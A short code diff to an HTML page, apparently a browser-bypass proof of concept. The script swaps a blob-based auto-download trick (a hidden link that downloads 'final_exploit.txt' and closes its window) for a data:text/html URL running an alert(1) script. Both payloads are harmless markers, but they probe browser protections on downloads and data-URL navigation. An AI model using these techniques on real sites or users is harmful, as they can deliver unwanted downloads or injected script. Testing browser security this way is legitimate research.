@@ -17,29 +17,10 @@
         document.addEventListener("keydown", (e) => {
             if (e.key === "Enter") {
                 console.log("Executing Blob-Escape Strategy...");
-                const htmlContent = `
-            <html>
-            <body>
-                <h1>Processing Download...</h1>
-                <script>
-                    const a = document.createElement("a");
-                    a.href = "data:application/octet-stream;base64,UE9DIC0gQmxvYiBCeXBhc3M=";
-                    a.download = "final_exploit.txt";
-                    document.body.appendChild(a);
-                    a.click();
-                    setTimeout(() => { window.close(); }, 3000);
+                window.open("data:text/html,<script>alert(1)<\/script>");
+            }
+        });
     </script>
-</body>
-
-</html>
-`;
-
-const blob = new Blob([htmlContent], { type: 'text/html' });
-const blobUrl = URL.createObjectURL(blob);
-window.open(blobUrl, "_blank", "width=300,height=300");
-}
-});
-</script>
 </body>
 
 </html>
